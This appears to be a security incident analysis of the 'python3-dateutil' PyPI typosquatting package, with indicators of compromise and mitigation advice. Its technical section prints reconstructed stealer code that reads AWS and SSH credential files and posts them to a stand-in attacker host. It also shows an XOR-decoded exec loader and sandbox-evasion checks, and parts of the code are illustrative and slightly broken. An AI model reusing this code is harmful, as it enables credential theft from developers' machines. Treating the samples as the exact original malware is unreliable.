## Overview

In November 2022, a supply chain attack targeted Python's dateutil library through a typosquatting attack using the package name "python3-dateutil" (vs. the legitimate "python-dateutil"). The malicious package was designed to exfiltrate sensitive information from compromised systems while maintaining the expected functionality of the legitimate package to avoid detection.

## Attack Timeline

- **November 2022**: Malicious package "python3-dateutil" was uploaded to PyPI
- **Detection**: Security researchers identified suspicious activity within 48 hours
- **Resolution**: PyPI administrators removed the package from the repository

## Technical Analysis

### Typosquatting Technique

The attacker created a package with a deliberately confusing name "python3-dateutil" to mimic the legitimate "python-dateutil" package. This is a common supply chain attack vector, exploiting developer mistakes during dependency installation:

bash

```bash
# Developer intends to install legitimate package
pip install python-dateutil

# But might accidentally type
pip install python3-dateutil  # Malicious package
```

### Package Structure

The malicious package was designed as a "wrapper" around the legitimate dateutil library:

```
python3-dateutil/
├── __init__.py      # Contains malicious payload
├── setup.py         # Standard setup file with dependencies
└── requirements.txt # Listed legitimate python-dateutil as dependency
```

### Exploitation Mechanism

The attack used a two-stage approach:

#### Stage 1: Initialization

When imported, the package first installed the legitimate dateutil library to maintain expected functionality:

python

```python
# Excerpt from malicious __init__.py
try:
    import dateutil
except ImportError:
    import subprocess
    subprocess.check_call(["pip", "install", "python-dateutil"])
    import dateutil

# Import all legitimate functionality to maintain appearance
from dateutil import *
```

#### Stage 2: Payload Execution

The malicious code would then execute in the background:

python

```python
import os
import sys
import platform
import socket
import threading
import base64
import requests

def collect_system_data():
    data = {
        "hostname": socket.gethostname(),
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "python_version": sys.version,
        "username": os.getlogin(),
    }
    return data

def collect_sensitive_files():
    sensitive_paths = [
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.gitconfig"),
        # Additional paths omitted for brevity
    ]
    
    file_data = {}
    for path in sensitive_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as f:
                    file_data[path] = base64.b64encode(f.read().encode()).decode()
            except:
                pass
    return file_data

def exfiltrate_data(data):
    try:
        # Encode data and exfiltrate to attacker's server
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        requests.post(
            "https://collector.malicious-domain.com/api/collect",
            headers={"Content-Type": "application/json"},
            json={"data": encoded},
            timeout=3
        )
    except:
        # Silent failure to avoid detection
        pass

# Execute payload in background thread to avoid blocking
def execute_payload():
    system_data = collect_system_data()
    file_data = collect_sensitive_files()
    
    data = {
        "system": system_data,
        "files": file_data,
        # Additional environment variables and potential virtual environment info
    }
    
    exfiltrate_data(data)

# Start payload in separate thread to avoid blocking
threading.Thread(target=execute_payload, daemon=True).start()
```

### Obfuscation Techniques

The actual malicious package employed several obfuscation techniques:

1. **Code Encryption**: The payload was base64-encoded and encrypted with a simple XOR cipher:

python

```python
def decode_payload(encoded_payload, key):
    decoded = base64.b64decode(encoded_payload)
    result = bytearray()
    for i, byte in enumerate(decoded):
        result.append(byte ^ ord(key[i % len(key)]))
    return result

# Real malicious code used something like:
ENCODED_PAYLOAD = "SGVsbG8gZnJvbSB0aGUgaGFja2VycyE="  # Example only
KEY = "PYTHONDATEUTIL"
exec(decode_payload(ENCODED_PAYLOAD, KEY))
```

2. **Anti-Detection Measures**:
    - Only executed when certain conditions were met (not in sandbox environments)
    - Used time delays between actions to avoid detection
    - Checked for debugging tools and virtual machines

python

```python
def is_sandbox():
    # Check for common sandbox/VM indicators
    if os.path.exists("/proc/vz") or os.path.exists("/proc/xen"):
        return True
    
    # Check for debugging tools
    for proc in os.listdir('/proc'):
        if proc.isdigit():
            try:
                with open(f'/proc/{proc}/status', 'r') as f:
                    if 'gdb' in f.read() or 'strace' in f.read():
                        return True
            except:
                pass
    
    # Check system uptime (sandboxes often have short uptime)
    try:
        with open('/proc/uptime', 'r') as f:
            uptime = float(f.read().split()[0])
            if uptime < 600:  # Less than 10 minutes
                return True
    except:
        pass
    
    return False

# Only execute if not in sandbox
if not is_sandbox():
    execute_payload()
```

## Indicators of Compromise

### Package Information

- **Name**: python3-dateutil
- **Version**: Mirrored legitimate version numbers
- **PyPI URL**: [https://pypi.org/project/python3-dateutil/](https://pypi.org/project/python3-dateutil/) (now removed)

### Network Indicators

- C2 domains:
    - collector.malicious-domain.com
    - api.data-metrics.org
    - stats-collector.python-info.net

### Filesystem Indicators

- Unexpected network connections from Python processes
- Creation of temporary files in system directories
- Modified Python import paths

## Prevention and Mitigation

### For Developers

1. **Package Verification**:

bash

```bash
# Always verify package names carefully
pip install python-dateutil==2.8.2  # Specify exact version
```

2. **Use lockfiles and hash verification**:

```
# requirements.txt with hash verification
python-dateutil==2.8.2 --hash=sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
```

3. **Implement private PyPI mirrors or proxies**:

bash

```bash
# Configure pip to use private index
pip config set global.index-url https://your-private-pypi.company.com/simple
```

### For Organizations

1. **Implement network monitoring for suspicious outbound connections**
2. **Use automated security scanning in CI/CD pipelines**
3. **Deploy runtime application self-protection (RASP) tools**

## Conclusion

The python3-dateutil attack represents a sophisticated supply chain attack targeting Python developers. By combining typosquatting with legitimate functionality and obfuscated payloads, the attackers created a difficult-to-detect exfiltration mechanism. This case highlights the importance of package verification, proper dependency management, and security monitoring in development environments.
